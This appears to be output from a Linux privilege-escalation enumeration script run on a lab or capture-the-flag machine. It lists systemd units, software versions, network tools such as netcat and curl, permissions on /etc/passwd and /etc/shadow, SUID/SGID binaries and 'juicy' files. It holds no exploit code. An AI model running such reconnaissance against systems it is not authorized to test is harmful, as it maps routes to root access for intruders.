-rw-r--r-- 1 root root  521 Jan 28  2018 network.target
-rw-r--r-- 1 root root  554 Jan 28  2018 nss-lookup.target
-rw-r--r-- 1 root root  513 Jan 28  2018 nss-user-lookup.target
-rw-r--r-- 1 root root  394 Jan 28  2018 paths.target
-rw-r--r-- 1 root root  592 Jan 28  2018 poweroff.target
-rw-r--r-- 1 root root  417 Jan 28  2018 printer.target
-rw-r--r-- 1 root root  745 Jan 28  2018 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  655 Jan 28  2018 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  583 Jan 28  2018 reboot.target
-rw-r--r-- 1 root root  549 Jan 28  2018 remote-cryptsetup.target
-rw-r--r-- 1 root root  436 Jan 28  2018 remote-fs-pre.target
-rw-r--r-- 1 root root  522 Jan 28  2018 remote-fs.target
-rw-r--r-- 1 root root  492 Jan 28  2018 rescue.target
-rw-r--r-- 1 root root  540 Jan 28  2018 rpcbind.target
-rw-r--r-- 1 root root  442 Jan 28  2018 shutdown.target
-rw-r--r-- 1 root root  402 Jan 28  2018 sigpwr.target
-rw-r--r-- 1 root root  460 Jan 28  2018 sleep.target
-rw-r--r-- 1 root root  449 Jan 28  2018 slices.target
-rw-r--r-- 1 root root  420 Jan 28  2018 smartcard.target
-rw-r--r-- 1 root root  396 Jan 28  2018 sockets.target
-rw-r--r-- 1 root root  420 Jan 28  2018 sound.target
-rw-r--r-- 1 root root  503 Jan 28  2018 suspend.target
-rw-r--r-- 1 root root  393 Jan 28  2018 swap.target
-rw-r--r-- 1 root root  795 Jan 28  2018 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  767 Jan 28  2018 sys-kernel-config.mount
-rw-r--r-- 1 root root  710 Jan 28  2018 sys-kernel-debug.mount
-rw-r--r-- 1 root root  558 Jan 28  2018 sysinit.target
-rw-r--r-- 1 root root 1.4K Jan 28  2018 syslog.socket
-rw-r--r-- 1 root root  592 Jan 28  2018 system-update.target
-rw-r--r-- 1 root root  445 Jan 28  2018 system.slice
-rw-r--r-- 1 root root  704 Jan 28  2018 systemd-ask-password-console.path
-rw-r--r-- 1 root root  632 Jan 28  2018 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  564 Jan 28  2018 systemd-initctl.socket
-rw-r--r-- 1 root root 1.2K Jan 28  2018 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  882 Jan 28  2018 systemd-journald.socket
-rw-r--r-- 1 root root  631 Jan 28  2018 systemd-networkd.socket
-rw-r--r-- 1 root root  657 Jan 28  2018 systemd-rfkill.socket
-rw-r--r-- 1 root root  490 Jan 28  2018 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  635 Jan 28  2018 systemd-udevd-control.socket
-rw-r--r-- 1 root root  610 Jan 28  2018 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  435 Jan 28  2018 time-sync.target
-rw-r--r-- 1 root root  445 Jan 28  2018 timers.target
-rw-r--r-- 1 root root  457 Jan 28  2018 umount.target
-rw-r--r-- 1 root root  432 Jan 28  2018 user.slice
-rw-r--r-- 1 root root  493 Jan 25  2018 ssh.service
-rw-r--r-- 1 root root  244 Jan 25  2018 ssh@.service
-rw-r--r-- 1 root root  155 Jan 17  2018 phpsessionclean.service
-rw-r--r-- 1 root root  144 Jan 17  2018 phpsessionclean.timer
-rw-r--r-- 1 root root  216 Jan 16  2018 ssh.socket
-rw-r--r-- 1 root root  462 Jan 15  2018 mysql.service
-rw-r--r-- 1 root root  741 Dec 18  2017 accounts-daemon.service
-rw-r--r-- 1 root root  246 Nov 20  2017 apport-forward.socket
-rw-r--r-- 1 root root  142 Nov 20  2017 apport-forward@.service
-rw-r--r-- 1 root root  251 Nov 16  2017 cron.service
-rw-r--r-- 1 root root  266 Aug 15  2017 ufw.service
-rw-r--r-- 1 root root  250 Aug 15  2017 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Aug 15  2017 ureadahead-stop.timer
-rw-r--r-- 1 root root  401 Aug 15  2017 ureadahead.service
-rw-r--r-- 1 root root  330 Aug 10  2017 setvtrgb.service
-rw-r--r-- 1 root root  115 Apr 22  2017 acpid.path
-rw-r--r-- 1 root root  234 Apr 22  2017 acpid.service
-rw-r--r-- 1 root root  115 Apr 22  2017 acpid.socket
-rw-r--r-- 1 root root  626 Nov 28  2016 ifup@.service
-rw-r--r-- 1 root root  735 Nov 25  2016 networking.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Jul 16  2019 apache2-systemd.conf

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Sep  5 03:59 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Sep  5 03:59 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Sep  5 03:59 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Sep  5 03:59 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Sep  5 03:59 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Sep  5 03:59 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Sep  5 03:59 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Sep  5 03:59 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 15 Jun 10  2019 dbus.service -> ../dbus.service
lrwxrwxrwx 1 root root 29 Sep 11  2018 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 24 Sep 11  2018 plymouth-quit.service -> ../plymouth-quit.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Sep  5 03:59 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep  5 03:59 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Sep  5 03:59 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Sep  5 03:59 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Sep  5 03:59 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Sep  5 03:59 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Sep  5 03:59 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 14 Jun 10  2019 dbus.socket -> ../dbus.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Sep  5 03:59 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Sep  5 03:59 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Sep  5 03:59 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Sep  5 03:59 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Sep  5 03:59 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Sep  5 03:59 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Sep  5 03:59 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Sep  5 03:59 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Sep  5 03:59 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Sep  5 03:59 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 30 Sep  5 03:59 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 32 Sep  5 03:59 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 27 Sep  5 03:59 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 36 Sep  5 03:59 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Sep  5 03:59 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Sep  5 03:59 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Sep  5 03:59 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Sep  5 03:59 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Sep  5 03:59 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 31 Sep  5 03:59 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 24 Sep  5 03:59 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 30 Sep  5 03:59 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Sep 11  2018 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Sep 11  2018 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Sep  5 03:59 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Jul 22  2019 debian.conf

/lib/systemd/system/user@.service.d:
total 4.0K
-rw-r--r-- 1 root root 125 Jul 22  2019 timeout.conf

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Sep 11  2018 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 11  2018 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Sep 11  2018 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Sep 11  2018 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 28 Sep 11  2018 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 26 Sep 11  2018 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/network:
total 16K
-rw-r--r-- 1 root root 645 Jan 28  2018 80-container-host0.network
-rw-r--r-- 1 root root 718 Jan 28  2018 80-container-ve.network
-rw-r--r-- 1 root root 704 Jan 28  2018 80-container-vz.network
-rw-r--r-- 1 root root 412 Jan 28  2018 99-default.link

/lib/systemd/system-generators:
total 240K
-rwxr-xr-x 1 root root  23K Sep  5 03:59 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  10K Sep  5 03:59 systemd-debug-generator
-rwxr-xr-x 1 root root  31K Sep  5 03:59 systemd-fstab-generator
-rwxr-xr-x 1 root root  14K Sep  5 03:59 systemd-getty-generator
-rwxr-xr-x 1 root root  26K Sep  5 03:59 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  10K Sep  5 03:59 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  10K Sep  5 03:59 systemd-rc-local-generator
-rwxr-xr-x 1 root root  10K Sep  5 03:59 systemd-system-update-generator
-rwxr-xr-x 1 root root  31K Sep  5 03:59 systemd-sysv-generator
-rwxr-xr-x 1 root root  14K Sep  5 03:59 systemd-veritysetup-generator
-rwxr-xr-x 1 root root  19K Jul 12  2019 snapd-generator
lrwxrwxrwx 1 root root   22 Jan 10  2019 netplan -> ../../netplan/generate
-rwxr-xr-x 1 root root  287 Oct 15  2018 friendly-recovery
-rwxr-xr-x 1 root root 4.8K Oct  2  2018 cloud-init-generator
-rwxr-xr-x 1 root root  11K Apr 12  2018 lvm2-activation-generator

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 951 Jan 28  2018 90-systemd.preset

/lib/systemd/system-sleep:
total 8.0K
-rwxr-xr-x 1 root root 219 Dec 13  2018 unattended-upgrades
-rwxr-xr-x 1 root root  92 Feb 22  2018 hdparm

/lib/systemd/system-shutdown:
total 4.0K
-rwxr-xr-x 1 root root 160 Jul  2  2018 mdadm.shutdown


[00;33m### SOFTWARE #############################################[00m
[00;31m[-] Sudo version:[00m
Sudo version 1.8.21p2


[00;31m[-] MYSQL version:[00m
mysql  Ver 14.14 Distrib 5.7.28, for Linux (x86_64) using  EditLine wrapper


[00;31m[-] Apache version:[00m
Server version: Apache/2.4.29 (Ubuntu)
Server built:   2019-09-16T12:58:48


[00;31m[-] Apache user configuration:[00m
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[00;31m[-] Installed Apache modules:[00m
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 reqtimeout_module (shared)
 rewrite_module (shared)
 setenvif_module (shared)
 status_module (shared)


[00;33m### INTERESTING FILES ####################################[00m
[00;31m[-] Useful file locations:[00m
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[00;31m[-] Installed compilers:[00m
ii  g++                                       4:7.4.0-1ubuntu2.3                amd64        GNU C++ compiler
ii  g++-7                                     7.4.0-1ubuntu1~18.04.1            amd64        GNU C++ compiler
ii  gcc                                       4:7.4.0-1ubuntu2.3                amd64        GNU C compiler
ii  gcc-7                                     7.4.0-1ubuntu1~18.04.1            amd64        GNU C compiler


[00;31m[-] Can we read/write sensitive files:[00m
-rw-r--r-- 1 root root 1722 Dec 16 00:11 /etc/passwd
-rw-r--r-- 1 root root 740 Dec 16 00:11 /etc/group
-rw-r--r-- 1 root root 581 Apr  9  2018 /etc/profile
-rw-r----- 1 root shadow 1114 Dec 16 00:11 /etc/shadow


[00;31m[-] SUID files:[00m
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-sr-x 1 root root 109432 Jul 12  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 149080 Oct 10 18:32 /usr/bin/sudo
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 76496 Jan 25  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Jan 25  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 59640 Jan 25  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 18448 Mar  9  2017 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 44664 Jan 25  2018 /bin/su
-rwsr-xr-x 1 root root 64424 Mar  9  2017 /bin/ping
-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount
-rwsr-xr-x 1 root root 40152 Oct 10 09:34 /snap/core/8039/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8039/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8039/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8039/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10 09:34 /snap/core/8039/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8039/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8039/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8039/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8039/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8039/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11 12:01 /snap/core/8039/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8039/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8039/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Oct 30 12:39 /snap/core/8039/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8039/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 May 15  2019 /snap/core/7713/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/7713/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/7713/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/7713/bin/su
-rwsr-xr-x 1 root root 27608 May 15  2019 /snap/core/7713/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/7713/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/7713/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/7713/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/7713/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/7713/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jun 10  2019 /snap/core/7713/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/7713/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Aug 30 07:09 /snap/core/7713/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/7713/usr/sbin/pppd


[00;31m[-] SGID files:[00m
-rwxr-sr-x 1 root shadow 34816 Apr  5  2018 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 34816 Apr  5  2018 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 root root 109432 Jul 12  2019 /usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root ssh 362640 Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 22808 Jan 25  2018 /usr/bin/expiry
-rwxr-sr-x 1 root tty 30800 Oct 15  2018 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71816 Jan 25  2018 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /snap/core/8039/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /snap/core/8039/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 62336 Mar 25  2019 /snap/core/8039/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36080 Apr  5  2016 /snap/core/8039/usr/bin/crontab
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /snap/core/8039/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 22768 Mar 25  2019 /snap/core/8039/usr/bin/expiry
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/8039/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/8039/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/8039/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 358624 Mar  4  2019 /snap/core/8039/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27368 Oct 10 09:34 /snap/core/8039/usr/bin/wall
-rwsr-sr-x 1 root root 106696 Oct 30 12:39 /snap/core/8039/usr/lib/snapd/snap-confine
-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /snap/core/7713/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /snap/core/7713/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 62336 Mar 25  2019 /snap/core/7713/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36080 Apr  5  2016 /snap/core/7713/usr/bin/crontab
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /snap/core/7713/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 22768 Mar 25  2019 /snap/core/7713/usr/bin/expiry
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/7713/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/7713/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /snap/core/7713/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 358624 Mar  4  2019 /snap/core/7713/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27368 May 15  2019 /snap/core/7713/usr/bin/wall
-rwsr-sr-x 1 root root 106696 Aug 30 07:09 /snap/core/7713/usr/lib/snapd/snap-confine


[00;31m[+] Files with POSIX capabilities set:[00m
/usr/bin/mtr-packet = cap_net_raw+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[00;31m[-] All *.conf files in /etc (recursive 1 level):[00m
-rw-r--r-- 1 root root 1358 Jan 30  2018 /etc/rsyslog.conf
-rw-r--r-- 1 root root 92 Apr  9  2018 /etc/host.conf
-rw-r--r-- 1 root root 14867 Oct 13  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 403 Mar  1  2018 /etc/updatedb.conf
-rw-r--r-- 1 root root 1260 Feb 26  2018 /etc/ucf.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 2969 Feb 28  2018 /etc/debconf.conf
-rw-r--r-- 1 root root 2683 Jan 17  2018 /etc/sysctl.conf
-rw-r--r-- 1 root root 5898 Feb 14  2019 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 4861 Feb 22  2018 /etc/hdparm.conf
-rw-r--r-- 1 root root 2584 Feb  1  2018 /etc/gai.conf
-rw-r--r-- 1 root root 350 Feb 14  2019 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 6920 Sep 20  2018 /etc/overlayroot.conf
-rw-r--r-- 1 root root 703 Aug 21  2017 /etc/logrotate.conf
-rw-r--r-- 1 root root 513 Feb 14  2019 /etc/nsswitch.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 191 Feb  7  2018 /etc/libaudit.conf
-rw-r--r-- 1 root root 604 Aug 13  2017 /etc/deluser.conf
-rw-r--r-- 1 root root 3028 Feb 14  2019 /etc/adduser.conf
-rw-r--r-- 1 root root 100 Jun 25  2018 /etc/sos.conf
-rw-r--r-- 1 root root 552 Apr  4  2018 /etc/pam.conf
-rw-r--r-- 1 root root 812 Mar 24  2018 /etc/mke2fs.conf


[00;31m[-] Location and contents (if accessible) of .bash_history file(s):[00m
/home/observer/.bash_history


[00;31m[-] Any interesting mail in /var/mail:[00m
total 8
drwxrwsr-x  2 root mail 4096 Feb 14  2019 .
drwxr-xr-x 14 root root 4096 Sep  5 03:33 ..


[00;31m[-] Anything juicy in the Dockerfile:[00m
-rw-r--r-- 1 egre55 egre55 114 May 15  2019 /var/www/main/vendor/twirp/twirp/Dockerfile


[00;33m### SCAN COMPLETE ####################################[00m
